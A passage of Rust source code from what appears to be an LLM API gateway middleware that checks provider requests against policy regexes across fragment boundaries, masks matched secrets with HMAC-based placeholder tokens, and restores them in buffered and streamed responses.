            && key_is(&path[2], "function")
            && key_is(&path[3], "parameters"))
            || (path.len() >= 4
                && key_is(&path[0], "functions")
                && is_index(&path[1])
                && key_is(&path[2], "parameters")))
}

fn native_schema_description_path(path: &[StreamPathSegment]) -> bool {
    path.last().is_some_and(|last| key_is(last, "description"))
        && path.len() >= 4
        && key_is(&path[0], "tools")
        && is_index(&path[1])
        && key_is(&path[2], "input_schema")
}

fn responses_schema_description_path(path: &[StreamPathSegment]) -> bool {
    path.last().is_some_and(|last| key_is(last, "description"))
        && path.len() >= 4
        && key_is(&path[0], "tools")
        && is_index(&path[1])
        && key_is(&path[2], "parameters")
}

/// Refuse matches assembled across any caller-controlled member names or string
/// values that enter the provider request. This intentionally includes URL,
/// file/media, and protocol-control strings. The route-semantic pass below
/// separately removes non-text media so text fragments on either side of media
/// remain adjacent for policy purposes.
fn complete_provider_wire_sequence_has_match(value: &Value, rules: &[CompiledRule]) -> bool {
    let mut wire_fragments = Vec::new();
    let mut value_fragments = Vec::new();
    collect_provider_wire_fragments(
        value,
        true,
        false,
        &mut wire_fragments,
        &mut value_fragments,
    );
    fragments_have_cross_boundary_match(&wire_fragments, rules)
        || fragments_have_cross_boundary_match(&value_fragments, rules)
}

fn collect_provider_wire_fragments<'a>(
    value: &'a Value,
    root: bool,
    skip_protected_continuation: bool,
    wire_fragments: &mut Vec<&'a str>,
    value_fragments: &mut Vec<&'a str>,
) {
    match value {
        Value::String(text) => {
            wire_fragments.push(text);
            value_fragments.push(text);
        }
        Value::Array(values) => {
            for value in values {
                collect_provider_wire_fragments(
                    value,
                    false,
                    skip_protected_continuation,
                    wire_fragments,
                    value_fragments,
                );
            }
        }
        Value::Object(fields) => {
            for (field, value) in fields {
                // The inbound alias is consumed by gateway routing and replaced
                // by the resolved provider model before dispatch.
                if root
                    && (field == "model"
                        || (skip_protected_continuation && field == "previous_response_id"))
                {
                    continue;
                }
                wire_fragments.push(field);
                collect_provider_wire_fragments(
                    value,
                    false,
                    skip_protected_continuation,
                    wire_fragments,
                    value_fragments,
                );
            }
        }
        Value::Null | Value::Bool(_) | Value::Number(_) => {}
    }
}

/// Canonicalize provider-visible prompt strings in route-semantic order and
/// reject a match that crosses any semantic value boundary. Structural labels
/// and complete media objects are omitted so text-image-text sequences remain
/// adjacent. A second canonical pass retains URL/file locators but omits media
/// controls and binary payloads, catching split matches involving those
/// provider-visible values.
fn complete_provider_text_sequence_has_match(
    surface: MiddlewareSurface,
    body: &Value,
    rules: &[CompiledRule],
) -> bool {
    fragments_have_cross_boundary_match(&provider_text_sequence(surface, body, false), rules)
        || fragments_have_cross_boundary_match(&provider_text_sequence(surface, body, true), rules)
}

fn provider_text_sequence(
    surface: MiddlewareSurface,
    body: &Value,
    include_media_locators: bool,
) -> Vec<&str> {
    let mut fragments = Vec::new();
    let Some(fields) = body.as_object() else {
        return fragments;
    };
    let selected: &[&str] = match surface {
        MiddlewareSurface::ChatCompletions => {
            if let Some(messages) = fields.get("messages").and_then(Value::as_array) {
                for message in messages {
                    if let Some(message) = message.as_object() {
                        for field in ["name", "content", "tool_calls"] {
                            if let Some(value) = message.get(field) {
                                collect_provider_text_fragments(
                                    surface,
                                    value,
                                    false,
                                    Some(field),
                                    include_media_locators,
                                    &mut fragments,
                                );
                            }
                        }
                        for (field, value) in message {
                            if matches!(field.as_str(), "role" | "name" | "content" | "tool_calls")
                            {
                                continue;
                            }
                            collect_provider_text_fragments(
                                surface,
                                value,
                                false,
                                Some(field),
                                include_media_locators,
                                &mut fragments,
                            );
                        }
                    } else {
                        collect_provider_text_fragments(
                            surface,
                            message,
                            false,
                            Some("messages"),
                            include_media_locators,
                            &mut fragments,
                        );
                    }
                }
            }
            &["messages"]
        }
        MiddlewareSurface::NativeMessages => {
            for field in ["system", "messages"] {
                if let Some(value) = fields.get(field) {
                    collect_provider_text_fragments(
                        surface,
                        value,
                        false,
                        Some(field),
                        include_media_locators,
                        &mut fragments,
                    );
                }
            }
            &["system", "messages"]
        }
        MiddlewareSurface::Responses => {
            for field in ["instructions", "input"] {
                if let Some(value) = fields.get(field) {
                    collect_provider_text_fragments(
                        surface,
                        value,
                        false,
                        Some(field),
                        include_media_locators,
                        &mut fragments,
                    );
                }
            }
            &["instructions", "input"]
        }
        MiddlewareSurface::Embeddings => {
            if let Some(value) = fields.get("input") {
                collect_provider_text_fragments(
                    surface,
                    value,
                    false,
                    Some("input"),
                    include_media_locators,
                    &mut fragments,
                );
            }
            &["input"]
        }
    };
    for (field, value) in fields {
        if selected.contains(&field.as_str()) || protected_routing_field(field) {
            continue;
        }
        collect_provider_text_fragments(
            surface,
            value,
            false,
            Some(field),
            include_media_locators,
            &mut fragments,
        );
    }
    fragments
}

fn collect_provider_text_fragments<'a>(
    surface: MiddlewareSurface,
    value: &'a Value,
    root: bool,
    field: Option<&str>,
    include_media_locators: bool,
    fragments: &mut Vec<&'a str>,
) {
    match value {
        Value::String(text) if !field.is_some_and(|field| non_prompt_control(surface, field)) => {
            fragments.push(text);
        }
        Value::String(_) | Value::Null | Value::Bool(_) | Value::Number(_) => {}
        Value::Array(values) => {
            for value in values {
                collect_provider_text_fragments(
                    surface,
                    value,
                    false,
                    field,
                    include_media_locators,
                    fragments,
                );
            }
        }
        Value::Object(fields) => {
            let media_container = fields.contains_key("media_type")
                || fields
                    .get("type")
                    .and_then(Value::as_str)
                    .is_some_and(|kind| {
                        matches!(
                            kind,
                            "image"
                                | "image_url"
                                | "input_image"
                                | "audio"
                                | "input_audio"
                                | "file"
                        )
                    });
            if media_container && !include_media_locators {
                return;
            }
            for (name, value) in fields {
                if root && protected_routing_field(name) {
                    continue;
                }
                if media_container && name == "data" {
                    continue;
                }
                collect_provider_text_fragments(
                    surface,
                    value,
                    false,
                    Some(name),
                    include_media_locators,
                    fragments,
                );
            }
        }
    }
}

fn non_prompt_control(surface: MiddlewareSurface, field: &str) -> bool {
    match surface {
        MiddlewareSurface::ChatCompletions
        | MiddlewareSurface::NativeMessages
        | MiddlewareSurface::Responses => {
            matches!(field, "type" | "role" | "media_type" | "mime_type")
        }
        MiddlewareSurface::Embeddings => matches!(field, "encoding_format" | "dimensions"),
    }
}

fn array_has_cross_fragment_match(values: &[Value], rules: &[CompiledRule]) -> bool {
    let mut fragments = Vec::new();
    for value in values {
        if let Some(text) = direct_text_fragment(value) {
            fragments.push(text);
        } else {
            if fragments_have_cross_boundary_match(&fragments, rules) {
                return true;
            }
            fragments.clear();
        }
    }
    fragments_have_cross_boundary_match(&fragments, rules)
}

fn direct_text_fragment(value: &Value) -> Option<&str> {
    match value {
        Value::String(text) => Some(text),
        Value::Object(fields) => fields
            .get("text")
            .or_else(|| fields.get("content"))
            .and_then(Value::as_str),
        Value::Null | Value::Bool(_) | Value::Number(_) | Value::Array(_) => None,
    }
}

fn fragments_have_cross_boundary_match(fragments: &[&str], rules: &[CompiledRule]) -> bool {
    if fragments.len() < 2 {
        return false;
    }
    let Some(joined_len) = fragments
        .iter()
        .try_fold(0_usize, |bytes, fragment| bytes.checked_add(fragment.len()))
    else {
        return true;
    };
    let mut joined = String::new();
    if joined.try_reserve_exact(joined_len).is_err() {
        return true;
    }
    let mut boundaries = Vec::new();
    if boundaries.try_reserve_exact(fragments.len() - 1).is_err() {
        return true;
    }
    let mut spans = Vec::new();
    if spans.try_reserve_exact(fragments.len()).is_err() {
        return true;
    }
    for (index, fragment) in fragments.iter().enumerate() {
        let start = joined.len();
        joined.push_str(fragment);
        spans.push((start, joined.len(), *fragment));
        if index + 1 < fragments.len() {
            boundaries.push(joined.len());
        }
    }
    rules.iter().any(|rule| {
        let mut boundary_index = 0;
        let mut fragment_index = 0;
        rule.regex.find_iter(&joined).any(|matched| {
            while boundaries
                .get(boundary_index)
                .is_some_and(|boundary| *boundary <= matched.start())
            {
                boundary_index += 1;
            }
            let crosses_boundary = boundaries
                .get(boundary_index)
                .is_some_and(|boundary| *boundary < matched.end());
            if !crosses_boundary {
                return false;
            }

            // A greedy regex can extend a normal in-fragment match into an
            // adjacent member name or value. The direct match is independently
            // redacted or blocked and therefore breaks the joined match. Only
            // refuse when no overlapping direct match exists in a constituent
            // fragment. Joined matches and spans are monotonic, bounding this
            // extra work to the fragments at each match boundary.
            while spans
                .get(fragment_index)
                .is_some_and(|(_, end, _)| *end <= matched.start())
            {
                fragment_index += 1;
            }
            let mut index = fragment_index;
            while let Some((start, _, fragment)) = spans.get(index) {
                if *start >= matched.end() {
                    break;
                }
                if rule.regex.find_iter(fragment).any(|direct| {
                    let direct_start = start + direct.start();
                    let direct_end = start + direct.end();
                    direct_start < matched.end() && matched.start() < direct_end
                }) {
                    return false;
                }
                index += 1;
            }
            true
        })
    })
}

fn fragment_sequence_has_cross_boundary_match_in_both_directions(
    fragments: &[&str],
    rules: &[CompiledRule],
) -> bool {
    if fragments_have_cross_boundary_match(fragments, rules) {
        return true;
    }
    let mut reverse = Vec::new();
    if reverse.try_reserve_exact(fragments.len()).is_err() {
        return true;
    }
    reverse.extend(fragments.iter().rev().copied());
    fragments_have_cross_boundary_match(&reverse, rules)
}

fn fragment_sequences_have_cross_boundary_match<'a>(
    left: &[&'a str],
    right: &[&'a str],
    rules: &[CompiledRule],
) -> bool {
    let Some(sequence_len) = left.len().checked_add(right.len()) else {
        return true;
    };
    let mut left_then_right = Vec::new();
    if left_then_right.try_reserve_exact(sequence_len).is_err() {
        return true;
    }
    left_then_right.extend_from_slice(left);
    left_then_right.extend_from_slice(right);
    if fragments_have_cross_boundary_match(&left_then_right, rules) {
        return true;
    }

    let mut right_then_left = Vec::new();
    if right_then_left.try_reserve_exact(sequence_len).is_err() {
        return true;
    }
    right_then_left.extend_from_slice(right);
    right_then_left.extend_from_slice(left);
    fragments_have_cross_boundary_match(&right_then_left, rules)
}

fn protected_fragments_have_cross_boundary_match(
    protected: &[&str],
    body_sequence: &[&str],
    rules: &[CompiledRule],
) -> bool {
    protected.iter().any(|fragment| {
        fragment_sequences_have_cross_boundary_match(&[*fragment], body_sequence, rules)
    })
}

fn any_matching_value(value: &Value, regex: &Regex, root: bool) -> bool {
    match value {
        Value::String(text) => regex.is_match(text),
        Value::Array(values) => values
            .iter()
            .any(|value| any_matching_value(value, regex, false)),
        Value::Object(fields) => fields.iter().any(|(field, value)| {
            !(root && protected_routing_field(field)) && any_matching_value(value, regex, false)
        }),
        Value::Null | Value::Bool(_) | Value::Number(_) => false,
    }
}

#[derive(Default)]
struct CountingWriter {
    bytes: usize,
}

impl io::Write for CountingWriter {
    fn write(&mut self, buffer: &[u8]) -> io::Result<usize> {
        self.bytes = self
            .bytes
            .checked_add(buffer.len())
            .ok_or_else(|| io::Error::other("serialized request length overflow"))?;
        Ok(buffer.len())
    }

    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

fn serialized_json_len(value: &Value) -> Result<usize, MiddlewareError> {
    let mut writer = CountingWriter::default();
    serde_json::to_writer(&mut writer, value).map_err(|_| MiddlewareError::Failed)?;
    writer.flush().map_err(|_| MiddlewareError::Failed)?;
    Ok(writer.bytes)
}

fn masked_request_serialized_len(
    surface: MiddlewareSurface,
    value: &Value,
    redaction: Option<&Regex>,
) -> Result<usize, MiddlewareError> {
    let mut bytes = serialized_json_len(value)?;
    apply_masked_length_delta(
        surface,
        value,
        redaction,
        &mut bytes,
        true,
        &mut Vec::new(),
        &mut Vec::new(),
    )?;
    Ok(bytes)
}

fn apply_masked_length_delta(
    surface: MiddlewareSurface,
    value: &Value,
    redaction: Option<&Regex>,
    bytes: &mut usize,
    root: bool,
    path: &mut StreamPath,
    type_stack: &mut Vec<Option<String>>,
) -> Result<(), MiddlewareError> {
    match value {
        Value::String(text) if redactable_request_text_path(surface, path, type_stack) => {
            let original = json_encoded_text_len(text)?;
            let (_, masked) = masked_text_lengths(text, redaction)?;
            *bytes = bytes
                .checked_sub(original)
                .and_then(|len| len.checked_add(masked))
                .ok_or(MiddlewareError::Failed)?;
        }
        Value::String(_) | Value::Null | Value::Bool(_) | Value::Number(_) => {}
        Value::Array(values) => {
            for (index, value) in values.iter().enumerate() {
                path.push(StreamPathSegment::ArrayIndex(index));
                apply_masked_length_delta(
                    surface, value, redaction, bytes, false, path, type_stack,
                )?;
                let _ = path.pop();
            }
        }
        Value::Object(fields) => {
            type_stack.push(
                fields
                    .get("type")
                    .and_then(Value::as_str)
                    .map(str::to_owned),
            );
            for (field, value) in fields {
                if !(root && protected_routing_field(field)) {
                    path.push(StreamPathSegment::ObjectKey(field.clone()));
                    apply_masked_length_delta(
                        surface, value, redaction, bytes, false, path, type_stack,
                    )?;
                    let _ = path.pop();
                }
            }
            let _ = type_stack.pop();
        }
    }
    Ok(())
}

struct MaskContext<'a> {
    surface: MiddlewareSurface,
    redaction: Option<&'a Regex>,
    key: &'a hmac::Key,
}

fn mask_value(
    context: &MaskContext<'_>,
    value: &mut Value,
    state: &mut RedactionState,
    root: bool,
    path: &mut StreamPath,
    type_stack: &mut Vec<Option<String>>,
) -> Result<(), MiddlewareError> {
    match value {
        Value::String(text) if redactable_request_text_path(context.surface, path, type_stack) => {
            *text = mask_text(text, context.redaction, context.key, state)?;
        }
        Value::String(_) => {}
        Value::Array(values) => {
            for (index, value) in values.iter_mut().enumerate() {
                path.push(StreamPathSegment::ArrayIndex(index));
                mask_value(context, value, state, false, path, type_stack)?;
                let _ = path.pop();
            }
        }
        Value::Object(fields) => {
            let container_type = fields
                .get("type")
                .and_then(Value::as_str)
                .map(str::to_owned);
            type_stack.push(container_type);
            for (field, value) in fields {
                if !(root && protected_routing_field(field)) {
                    path.push(StreamPathSegment::ObjectKey(field.clone()));
                    mask_value(context, value, state, false, path, type_stack)?;
                    let _ = path.pop();
                }
            }
            let _ = type_stack.pop();
        }
        Value::Null | Value::Bool(_) | Value::Number(_) => {}
    }
    Ok(())
}

fn protected_routing_field(field: &str) -> bool {
    matches!(field, "model" | "stream" | "previous_response_id")
}

fn mask_text(
    text: &str,
    redaction: Option<&Regex>,
    key: &hmac::Key,
    state: &mut RedactionState,
) -> Result<String, MiddlewareError> {
    let (masked_len, _) = masked_text_lengths(text, redaction)?;
    let mut output = String::new();
    output
        .try_reserve_exact(masked_len)
        .map_err(|_| MiddlewareError::Failed)?;
    let mut cursor = 0;
    for matched in redaction
        .into_iter()
        .flat_map(|regex| regex.find_iter(text))
    {
        let (start, end) = (matched.start(), matched.end());
        if start == end {
            // Defensive runtime check for regex constructs whose empty match is
            // not visible in compile-time HIR minimum-length analysis.
            return Err(MiddlewareError::Failed);
        }
        output.push_str(&text[cursor..start]);
        let secret = &text[start..end];
        let token = placeholder(key, secret);
        match state.originals.get(&token) {
            Some(previous) if previous != secret => return Err(MiddlewareError::Failed),
            Some(_) => {}
            None => {
                if state.originals.len() >= MAX_DISTINCT_REDACTIONS {
                    return Err(MiddlewareError::Failed);
                }
                state.originals.insert(token.clone(), secret.to_owned());
            }
        }
        output.push_str(&token);
        cursor = end;
    }
    output.push_str(&text[cursor..]);
    debug_assert_eq!(output.len(), masked_len);
    Ok(output)
}

/// Return the exact UTF-8 and JSON-string-content lengths after masking. This
/// pass performs no output allocation and uses the same merged match iterator as
/// [`mask_text`]. The regex crate's leftmost-first alternation chooses the first
/// policy rule at an equal start offset, and `find_iter` resumes at the selected
/// match's end. Those are exactly the former precedence and overlap semantics,
/// with one linear automaton scan instead of one suffix search per rule/match.
fn masked_text_lengths(
    text: &str,
    redaction: Option<&Regex>,
) -> Result<(usize, usize), MiddlewareError> {
    let mut masked_len = text.len();
    let mut encoded_len = json_encoded_text_len(text)?;
    for matched in redaction
        .into_iter()
        .flat_map(|regex| regex.find_iter(text))
    {
        let (start, end) = (matched.start(), matched.end());
        if start == end {
            return Err(MiddlewareError::Failed);
        }
        let secret = &text[start..end];
        masked_len = masked_len
            .checked_sub(secret.len())
            .and_then(|len| len.checked_add(TOKEN_BYTES))
            .ok_or(MiddlewareError::Failed)?;
        encoded_len = encoded_len
            .checked_sub(json_encoded_text_len(secret)?)
            .and_then(|len| len.checked_add(TOKEN_BYTES))
            .ok_or(MiddlewareError::Failed)?;
    }
    Ok((masked_len, encoded_len))
}

fn json_encoded_text_len(text: &str) -> Result<usize, MiddlewareError> {
    text.chars().try_fold(0_usize, |len, character| {
        let bytes = match character {
            '"' | '\\' | '\u{0008}' | '\u{0009}' | '\n' | '\u{000c}' | '\r' => 2,
            character if character <= '\u{001f}' => 6,
            character => character.len_utf8(),
        };
        len.checked_add(bytes).ok_or(MiddlewareError::Failed)
    })
}

fn placeholder(key: &hmac::Key, secret: &str) -> String {
    let tag = hmac::sign(key, secret.as_bytes());
    let digest = URL_SAFE_NO_PAD.encode(&tag.as_ref()[..TOKEN_DIGEST_BYTES]);
    debug_assert_eq!(digest.len(), TOKEN_DIGEST_TEXT_BYTES);
    format!("{TOKEN_PREFIX}{digest}{TOKEN_SUFFIX}")
}

fn restore_value(
    surface: MiddlewareSurface,
    value: &mut Value,
    path: &mut StreamPath,
    type_stack: &mut Vec<String>,
    originals: &BTreeMap<String, String>,
    budget: &mut RestoreBudget,
) -> Result<(), MiddlewareError> {
    match value {
        Value::String(text) if buffered_display_text_path(surface, path, type_stack) => {
            *text = budget.restore(text, originals)?;
        }
        Value::String(_) => {}
        Value::Array(values) => {
            for (index, value) in values.iter_mut().enumerate() {
                path.push(StreamPathSegment::ArrayIndex(index));
                restore_value(surface, value, path, type_stack, originals, budget)?;
                let _ = path.pop();
            }
        }
        Value::Object(fields) => {
            let container_type = fields
                .get("type")
                .and_then(Value::as_str)
                .map(str::to_owned);
            if let Some(container_type) = &container_type {
                type_stack.push(container_type.clone());
            }
            for (field, value) in fields {
                path.push(StreamPathSegment::ObjectKey(field.clone()));
                restore_value(surface, value, path, type_stack, originals, budget)?;
                let _ = path.pop();
            }
            if container_type.is_some() {
                let _ = type_stack.pop();
            }
        }
        Value::Null | Value::Bool(_) | Value::Number(_) => {}
    }
    Ok(())
}

struct RestoreBudget {
    remaining: usize,
}

impl RestoreBudget {
    fn new(limit: usize) -> Self {
        Self { remaining: limit }
    }

    fn restore(
        &mut self,
        text: &str,
        originals: &BTreeMap<String, String>,
    ) -> Result<String, MiddlewareError> {
        let restored = restore_text_bounded(text, originals, self.remaining)?;
        self.remaining = self
            .remaining
            .checked_sub(restored.len())
            .ok_or(MiddlewareError::Failed)?;
        Ok(restored)
    }
}

fn restored_text_len(
    text: &str,
    originals: &BTreeMap<String, String>,
) -> Result<usize, MiddlewareError> {
    if longest_concrete_prefix_suffix(text, originals) > 0 {
        return Err(MiddlewareError::Failed);
    }

    let mut output_len = text.len();
    let mut cursor = 0;
    while let Some(offset) = text[cursor..].find(TOKEN_PREFIX) {
        let start = cursor.checked_add(offset).ok_or(MiddlewareError::Failed)?;
        let end = start
            .checked_add(TOKEN_BYTES)
            .ok_or(MiddlewareError::Failed)?;
        if let Some(token) = text.get(start..end)
            && token.ends_with(TOKEN_SUFFIX)
            && let Some(secret) = originals.get(token)
        {
            output_len = output_len
                .checked_sub(TOKEN_BYTES)
                .and_then(|length| length.checked_add(secret.len()))
                .ok_or(MiddlewareError::Failed)?;
            cursor = end;
            continue;
        }

        // Unknown complete or partial AXOND-like text is provider content, not
        // a token generated by this request. Preserve it byte-for-byte.
        cursor = start
            .checked_add(TOKEN_PREFIX.len())
            .ok_or(MiddlewareError::Failed)?;
    }
    Ok(output_len)
}

fn restore_text_bounded(
    text: &str,
    originals: &BTreeMap<String, String>,
    max_bytes: usize,
) -> Result<String, MiddlewareError> {
    let output_len = restored_text_len(text, originals)?;
    if output_len > max_bytes {
        return Err(MiddlewareError::Failed);
    }

    let mut output = String::new();
    output
        .try_reserve_exact(output_len)
        .map_err(|_| MiddlewareError::Failed)?;
    let mut cursor = 0;
    while let Some(offset) = text[cursor..].find(TOKEN_PREFIX) {
        let start = cursor.checked_add(offset).ok_or(MiddlewareError::Failed)?;
        output.push_str(&text[cursor..start]);
        let end = start
            .checked_add(TOKEN_BYTES)
            .ok_or(MiddlewareError::Failed)?;
        if let Some(token) = text.get(start..end)
            && token.ends_with(TOKEN_SUFFIX)
            && let Some(secret) = originals.get(token)
        {
            output.push_str(secret);
            cursor = end;
            continue;
        }
        output.push_str(TOKEN_PREFIX);
        cursor = start
            .checked_add(TOKEN_PREFIX.len())
            .ok_or(MiddlewareError::Failed)?;
    }
    output.push_str(&text[cursor..]);
    debug_assert_eq!(output.len(), output_len);
    Ok(output)
}

struct StreamRestoreContext<'a> {
    event: Option<&'a str>,
    channels: &'a StreamChannels,
    originals: &'a BTreeMap<String, String>,
}

fn restore_stream_value(
    value: &mut Value,
    path: &mut StreamPath,
    type_stack: &mut Vec<String>,
    context: &StreamRestoreContext<'_>,
    stream_carry: &mut StreamCarryTransaction<'_>,
    budget: &mut RestoreBudget,
) -> Result<(), MiddlewareError> {
    match value {
        Value::String(text)
            if stream_display_text_path(
                context.channels.surface,
                path,
                context.event,
                type_stack,
            ) =>
        {
            let channel = context
                .channels
                .channel_for(path, context.event)
                .ok_or(MiddlewareError::Failed)?;
            if context.channels.surface == MiddlewareSurface::Responses
                && context.event == Some("response.output_text.done")
            {
                restore_responses_snapshot_text(
                    text,
                    &channel,
                    context.originals,
                    stream_carry,
                    budget,
                )?;
            } else {
                let carry_key = StreamCarryKey {
                    channel,
                    path: context.channels.stable_path_for(path, context.event),
                };
                restore_stream_text(text, &carry_key, context.originals, stream_carry, budget)?;
            }
        }
        Value::String(_) => {}
        Value::Array(values) => {
            for (index, value) in values.iter_mut().enumerate() {
                path.push(StreamPathSegment::ArrayIndex(index));
                restore_stream_value(value, path, type_stack, context, stream_carry, budget)?;
                let _ = path.pop();
            }
        }
        Value::Object(fields) => {
            let container_type = fields
                .get("type")
                .and_then(Value::as_str)
                .map(str::to_owned);
            if let Some(container_type) = &container_type {
                type_stack.push(container_type.clone());
            }
            for (field, value) in fields {
                path.push(StreamPathSegment::ObjectKey(field.clone()));
                restore_stream_value(value, path, type_stack, context, stream_carry, budget)?;
                let _ = path.pop();
            }
            if container_type.is_some() {
                let _ = type_stack.pop();
            }
        }
        Value::Null | Value::Bool(_) | Value::Number(_) => {}
    }
    Ok(())
}

fn buffered_display_text_path(
    surface: MiddlewareSurface,
    path: &[StreamPathSegment],
    type_stack: &[String],
) -> bool {
    match (surface, path) {
        // OpenAI Chat Completions.
        (MiddlewareSurface::ChatCompletions, [a, b, c, d]) => {
            key_is(a, "choices") && is_index(b) && key_is(c, "message") && key_is(d, "content")
        }
        (MiddlewareSurface::ChatCompletions, [a, b, c, d, e, f]) => {
            key_is(a, "choices")
                && is_index(b)
                && key_is(c, "message")
                && key_is(d, "content")
                && is_index(e)
                && key_is(f, "text")
                && type_is(type_stack, "text")
        }
        // Anthropic Messages and the ordinary Responses output shape.
        (MiddlewareSurface::NativeMessages, [a, b, c]) => {
            key_is(a, "content") && is_index(b) && key_is(c, "text") && type_is(type_stack, "text")
        }
        (MiddlewareSurface::Responses, [a, b, c, d, e]) => {
            key_is(a, "output")
                && is_index(b)
                && key_is(c, "content")
                && is_index(d)
                && key_is(e, "text")
                && type_suffix(type_stack, &["message", "output_text"])
        }
        _ => false,
    }
}

fn stream_display_text_path(
    surface: MiddlewareSurface,
    path: &[StreamPathSegment],
    event: Option<&str>,
    type_stack: &[String],
) -> bool {
    match (surface, path) {
        // OpenAI Chat Completions deltas.
        (MiddlewareSurface::ChatCompletions, [a, b, c, d]) => {
            key_is(a, "choices") && is_index(b) && key_is(c, "delta") && key_is(d, "content")
        }
        (MiddlewareSurface::ChatCompletions, [a, b, c, d, e, f]) => {
            key_is(a, "choices")
                && is_index(b)
                && key_is(c, "delta")
                && key_is(d, "content")
                && is_index(e)
                && key_is(f, "text")
                && type_is(type_stack, "text")
        }
        // A Responses semantic completion carries the final display text under
        // `response.output[].content[].text`.
        (MiddlewareSurface::Responses, [a, b, c, d, e, f]) => {
            event == Some("response.completed")
                && type_stack
                    .first()
                    .is_some_and(|kind| kind == "response.completed")
                && key_is(a, "response")
                && key_is(b, "output")
                && is_index(c)
                && key_is(d, "content")
                && is_index(e)
                && key_is(f, "text")
                && type_suffix(type_stack, &["message", "output_text"])
        }
        // Anthropic text deltas, never `input_json_delta` tool arguments.
        (MiddlewareSurface::NativeMessages, [a, b]) => {
            event == Some("content_block_delta")
                && key_is(a, "delta")
                && key_is(b, "text")
                && type_suffix(type_stack, &["content_block_delta", "text_delta"])
        }
        // OpenAI Responses text deltas/done events, never function-call
        // argument events that use a similarly named payload field.
        (MiddlewareSurface::Responses, [a]) => {
            (event == Some("response.output_text.delta")
                && type_is(type_stack, "response.output_text.delta")
                && key_is(a, "delta"))
                || (event == Some("response.output_text.done")
                    && type_is(type_stack, "response.output_text.done")
                    && key_is(a, "text"))
        }
        _ => false,
    }
}

fn key_is(segment: &StreamPathSegment, expected: &str) -> bool {
    matches!(segment, StreamPathSegment::ObjectKey(actual) if actual == expected)
}

fn is_index(segment: &StreamPathSegment) -> bool {
    matches!(segment, StreamPathSegment::ArrayIndex(_))
}

fn request_type_is(type_stack: &[Option<String>], expected: &str) -> bool {
    type_stack
        .iter()
        .rev()
        .find_map(Option::as_deref)
        .is_some_and(|actual| actual == expected)
}

fn request_type_suffix(type_stack: &[Option<String>], expected: &[&str]) -> bool {
    type_stack
        .iter()
        .filter_map(Option::as_deref)
        .rev()
        .take(expected.len())
        .eq(expected.iter().rev().copied())
}

fn request_immediate_type_is_absent_or(type_stack: &[Option<String>], expected: &str) -> bool {
    type_stack
        .last()
        .is_some_and(|actual| actual.as_deref().is_none_or(|actual| actual == expected))
}

fn request_parent_type_is_absent_or(type_stack: &[Option<String>], expected: &str) -> bool {
    let Some(parent_index) = type_stack.len().checked_sub(2) else {
        return false;
    };
    type_stack
        .get(parent_index)
        .is_some_and(|actual| actual.as_deref().is_none_or(|actual| actual == expected))
}

fn request_immediate_type_is_one_of(type_stack: &[Option<String>], expected: &[&str]) -> bool {
    type_stack.last().is_some_and(|actual| {
        actual
            .as_deref()
            .is_some_and(|actual| expected.contains(&actual))
    })
}

fn type_is(type_stack: &[String], expected: &str) -> bool {
    type_stack.last().is_some_and(|actual| actual == expected)
}

fn type_suffix(type_stack: &[String], expected: &[&str]) -> bool {
    type_stack.len() >= expected.len()
        && type_stack[type_stack.len() - expected.len()..]
            .iter()
            .map(String::as_str)
            .eq(expected.iter().copied())
}

fn restore_stream_text(
    text: &mut String,
    carry_key: &StreamCarryKey,
    originals: &BTreeMap<String, String>,
    stream_carry: &mut StreamCarryTransaction<'_>,
    budget: &mut RestoreBudget,
) -> Result<(), MiddlewareError> {
    let prior = stream_carry.get(carry_key).unwrap_or("").to_owned();
    let combined_len = prior
        .len()
        .checked_add(text.len())
        .ok_or(MiddlewareError::Failed)?;
    let mut combined = String::new();
    combined
        .try_reserve_exact(combined_len)
        .map_err(|_| MiddlewareError::Failed)?;
    combined.push_str(&prior);
    combined.push_str(text);

    let carry_len = longest_concrete_prefix_suffix(&combined, originals);
    let stable_len = combined.len() - carry_len;
    let restored = budget.restore(&combined[..stable_len], originals)?;

    if carry_len > 0 {
        stream_carry.insert(carry_key.clone(), combined[stable_len..].to_owned())?;
    } else {
        stream_carry.remove(carry_key)?;
    }
    *text = restored;
    Ok(())
}

fn restore_responses_snapshot_text(
    text: &mut String,
    channel: &str,
    originals: &BTreeMap<String, String>,
    stream_carry: &mut StreamCarryTransaction<'_>,
    budget: &mut RestoreBudget,
) -> Result<(), MiddlewareError> {
    // `output_text.done.text` is the complete content snapshot, not another
    // delta. It may resolve a withheld generated-token prefix for this exact
    // item/output/content identity, but an inconsistent snapshot fails closed.
    let delta_carry_key = StreamCarryKey {
        channel: channel.to_owned(),
        path: vec![StreamPathSegment::ObjectKey("delta".to_owned())],
    };
    if let Some(prior) = stream_carry.get(&delta_carry_key)
        && !text_contains_concrete_token_with_prefix(text, prior, originals)
    {
        return Err(MiddlewareError::Failed);
    }

    let restored = budget.restore(text, originals)?;
    stream_carry.remove(&delta_carry_key)?;
    *text = restored;
    Ok(())
}

fn strict_prefix_of_concrete_token(candidate: &str, originals: &BTreeMap<String, String>) -> bool {
    if candidate.is_empty()
        || candidate.len() >= TOKEN_BYTES
        || candidate.as_bytes().first() != Some(&b'[')
    {
        return false;
    }
    // BTreeMap range lookup is an indexed O(log n) prefix probe. The first key
    // not less than the candidate is the only key needed to prove whether any
    // concrete request token has this prefix.
    originals
        .range(candidate.to_owned()..)
        .next()
        .is_some_and(|(token, _)| token.starts_with(candidate))
}

fn longest_concrete_prefix_suffix(text: &str, originals: &BTreeMap<String, String>) -> usize {
    (1..TOKEN_BYTES)
        .rev()
        .filter(|length| *length <= text.len() && text.is_char_boundary(text.len() - *length))
        .find(|length| strict_prefix_of_concrete_token(&text[text.len() - *length..], originals))
        .unwrap_or(0)
}

/// Resolve a Responses snapshot carry by scanning the bounded snapshot text for
/// exact token-shaped substrings and using the originals map's indexed lookup.
/// This is linear in provider text and never linear in the number of request
/// originals, even when the carried prefix is the common `[AXOND:` stem.
fn text_contains_concrete_token_with_prefix(
    text: &str,
    prefix: &str,
    originals: &BTreeMap<String, String>,
) -> bool {
    let mut cursor = 0;
    while let Some(offset) = text[cursor..].find(TOKEN_PREFIX) {
        let start = cursor + offset;
        let end = start + TOKEN_BYTES;
        if let Some(token) = text.get(start..end)
            && token.ends_with(TOKEN_SUFFIX)
            && token.starts_with(prefix)
            && originals.contains_key(token)
        {
            return true;
        }
        cursor = start + TOKEN_PREFIX.len();
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{
        MiddlewareScope, MiddlewareVerdict, ModelUsage, ProviderRequest, ProviderResponse,
    };
    use serde_json::json;

    const SECRET: &str = "alice@example.com";

